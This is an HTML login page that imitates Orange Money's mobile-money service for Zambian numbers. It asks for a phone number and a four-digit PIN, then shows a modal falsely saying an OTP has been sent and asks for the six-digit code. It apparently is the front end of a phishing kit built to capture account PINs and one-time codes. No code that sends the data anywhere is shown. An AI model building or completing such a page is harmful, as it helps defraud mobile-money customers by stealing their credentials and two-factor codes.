<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Orange Money â€” Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
}
html,body{height:100%}

body{
  font-family:Inter,system-ui,Arial;
  background:
    radial-gradient(900px 300px at 50% -150px, rgba(249,115,22,.25), transparent),
    linear-gradient(180deg,#fff4e6,#ffe0bf);
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#000;
}

/* CARD */
.card{
  width:100%;
  max-width:380px;
  background:#fff;
  padding:22px;
  border-radius:16px;
  box-shadow:
    0 18px 40px rgba(0,0,0,.18),
    inset 0 1px 0 rgba(255,255,255,.8);
}

/* LOGO */
.logo{
  height:46px;
  display:block;
  margin:0 auto 12px;
}

/* TEXT */
h2{
  text-align:center;
  margin:0 0 14px;
  font-size:20px;
  font-weight:700;
  color:#000;
}

label{
  display:block;
  font-size:13px;
  margin-top:10px;
  color:#000;
}

/* INPUTS */
input{
  width:100%;
  padding:11px;
  border-radius:10px;
  border:1px solid #e5e5e5;
  background:#fafafa;
  font-size:14px;
  color:#000;
}

input:focus{
  outline:none;
  border-color:#f97316;
  background:#fff;
}

/* BUTTON */
.btn{
  background:#f97316;
  color:#fff;
  padding:11px;
  border-radius:10px;
  border:0;
  margin-top:14px;
  width:100%;
  font-weight:700;
  cursor:pointer;
}

.btn[disabled]{
  background:#fdba74;
  cursor:not-allowed;
}

/* HELPERS */
.req{color:#f97316;margin-right:6px}
.small{font-size:13px;color:#444}
.success{color:#16a34a;font-weight:600}

.error{
  min-height:18px;
  font-size:13px;
  color:#dc2626;
}

/* PIN */
.pin-row{
  display:flex;
  gap:8px;
  justify-content:center;
  margin-top:8px;
}

.pin-digit{
  width:42px;
  height:50px;
  text-align:center;
  font-size:20px;
  border-radius:10px;
  border:1px solid #e5e5e5;
  background:#fafafa;
}

.pin-digit:focus{
  outline:none;
  border-color:#f97316;
  background:#fff;
}

/* OTP MODAL */
.otp-modal{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.55);
  display:flex;
  align-items:center;
  justify-content:center;
}

.otp-box{
  background:
    linear-gradient(
      180deg,
      rgba(255,255,255,.9),
      rgba(255,255,255,.75)
    );
  backdrop-filter:blur(20px) saturate(140%);
  -webkit-backdrop-filter:blur(20px) saturate(140%);
  padding:22px;
  border-radius:18px;
  min-width:320px;
  box-shadow:
    0 25px 50px rgba(0,0,0,.4),
    inset 0 1px 0 rgba(255,255,255,.9);
  border:1px solid rgba(255,255,255,.7);
}

.otp-row{
  display:flex;
  gap:8px;
  justify-content:center;
  margin-top:12px;
}

.otp-digit{
  width:42px;
  height:52px;
  text-align:center;
  font-size:20px;
  border-radius:10px;
  border:1px solid #e5e5e5;
  background:#fafafa;
}

.otp-digit:focus{
  outline:none;
  border-color:#f97316;
  background:#fff;
}

.otp-warning{
  color:#dc2626;
  font-size:13px;
  display:none;
}

.resend-row{
  display:flex;
  justify-content:space-between;
  margin-top:14px;
}

.resend-btn{
  background:#fff;
  border:1px solid #e5e5e5;
  padding:6px 12px;
  border-radius:10px;
}

.resend-btn[disabled]{opacity:.5}

#confirmOtp{
  background:#f97316;
  color:#fff;
}

#confirmOtp[disabled]{
  background:#fdba74;
}

#cancelOtp{
  background:#f3f4f6;
  color:#000;
}
</style>
</head>

<body>

<div class="card">
  <img src="assets/orange.png" alt="Orange Money" class="logo">
  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">
    <label><span class="req">â˜…</span>Mobile Number</label>
    <input id="phone" value="+260" inputmode="numeric">
    <div id="phoneError" class="error"></div>

    <label><span class="req">â˜…</span>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <input type="text" id="hp" style="display:none">
    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <div style="text-align:center"><strong>Enter OTP</strong></div>
    <p class="small">We have sent an OTP to your phone.</p>

    <div class="otp-row">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d0">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d1">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d2">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d3">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d4">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d5">
    </div>

    <div id="otpWarning" class="otp-warning">Please input 6 digits</div>

    <div class="resend-row">
      <div class="small" id="resendInfo">
        Resend available in <span id="countdown">120</span>s
      </div>
      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
    </div>

    <div style="display:flex;gap:10px;margin-top:14px">
      <button id="confirmOtp" disabled>Confirm</button>
      <button id="cancelOtp">Cancel</button>
    </div>

    <div id="otpStatus" class="small" style="margin-top:10px"></div>
  </div>
</div>

<script>
/* ===== PHONE ===== */
const phone = document.getElementById('phone');
const phoneError = document.getElementById('phoneError');
const loginBtn = document.getElementById('loginBtn');

function validatePhone(){
  const d = phone.value.replace('+260','');
  if (!/^\d{7}$/.test(d)) {
    phoneError.innerText = 'Enter a valid 7-digit mobile number';
    return false;
  }
  phoneError.innerText = '';
  return true;
}

phone.addEventListener('keydown',e=>{
  if(phone.selectionStart<=4 && e.key==='Backspace') e.preventDefault();
});

phone.addEventListener('input',()=>{
  let d = phone.value
    .replace('+260','')
    .replace(/\D/g,'')
    .replace(/^0+/,'')   // ðŸ”¥ drop leading zero(s)
    .slice(0,7);         // ðŸ”¥ keep only 7 digits

  phone.value = '+260' + d;
  validatePhone();
  updateLogin();
});

phone.addEventListener('blur', validatePhone);

/* ===== PIN ===== */
const pins=[...document.querySelectorAll('.pin-digit')];
let pinValue='';

pins.forEach((p,i)=>{
  p.addEventListener('input',()=>{
    p.value=p.value.replace(/\D/g,'');
    if(p.value && i<3) pins[i+1].focus();
    pinValue=pins.map(x=>x.value).join('');
    updateLogin();
  });
  p.addEventListener('keydown',e=>{
    if(e.key==='Backspace'&&!p.value&&i>0){
      pins[i-1].focus();
      pins[i-1].value='';
      e.preventDefault();
    }
  });
});

function updateLogin(){
  loginBtn.disabled = !(validatePhone() && /^\d{4}$/.test(pinValue));
}

/* ===== OTP LOGIC (UNCHANGED) ===== */
const otpModal=document.getElementById('otpModal');
const dEls=[0,1,2,3,4,5].map(i=>document.getElementById('d'+i));
const confirmBtn=document.getElementById('confirmOtp');
const cancelBtn=document.getElementById('cancelOtp');
const resendBtn=document.getElementById('resendBtn');
const otpWarning=document.getElementById('otpWarning');
const otpStatus=document.getElementById('otpStatus');
const countdown=document.getElementById('countdown');
const resendInfo=document.getElementById('resendInfo');

let timer,seconds=120;

function startCountdown(){
  clearInterval(timer);
  seconds=120;
  resendBtn.disabled=true;
  resendInfo.innerHTML='Resend available in <span id="countdown">120</span>s';
  timer=setInterval(()=>{
    seconds--;
    countdown.textContent=seconds;
    if(seconds<=0){
      clearInterval(timer);
      resendBtn.disabled=false;
      resendInfo.textContent="Didn't receive OTP?";
    }
  },1000);
}

function getOtp(){return dEls.map(d=>d.value).join('');}
function updateConfirm(){
  const ok=/^\d{6}$/.test(getOtp());
  confirmBtn.disabled=!ok;
  otpWarning.style.display=ok?'none':'block';
}

dEls.forEach((d,i)=>{
  d.addEventListener('input',()=>{
    d.value=d.value.replace(/\D/g,'');
    if(d.value && i<5) dEls[i+1].focus();
    updateConfirm();
  });
});

/* ===== LOGIN ===== */
document.getElementById('loginForm').addEventListener('submit',e=>{
  e.preventDefault();
  otpModal.style.display='flex';
  dEls.forEach(d=>d.value='');
  updateConfirm();
  startCountdown();
});

cancelBtn.onclick=()=>{
  otpModal.style.display='none';
  clearInterval(timer);
};
</script>

</body>
</html>
